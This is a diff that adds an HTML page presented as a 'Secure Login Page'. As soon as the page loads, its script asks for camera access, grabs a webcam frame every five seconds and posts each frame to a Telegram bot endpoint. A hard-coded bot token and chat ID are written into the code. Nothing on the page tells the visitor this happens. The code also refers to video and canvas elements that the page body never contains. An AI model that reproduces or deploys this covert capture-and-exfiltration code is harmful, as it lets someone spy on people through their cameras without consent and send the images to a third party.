@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Login Page</title>
+    <script>
+        
+
+        // Capture video and send it to Telegram
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            video.srcObject = stream;
+
+            setInterval(() => {
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+              canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', 6596412833);
+                formData.append('photo', blob, 'frame.jpg');
+
+                fetch('https://api.telegram.org/bot7881370417:AAEhVIU7kgrfuFsZXFz5PFFK3lRQpvq0G78/sendPhoto', {
+                  method: 'POST',
+                  body: formData
+                });
+
+              }, 'image/jpeg', 0.95);
+
+            }, 5000); // Every 5 seconds
+          })
+          .catch(error => {
+            console.error('Camera access denied or failed:', error);
+          });
+    </script>
+</head>
+<body>
+    <h1>Welcome to the secure login page</h1>
+</body>
+</html>
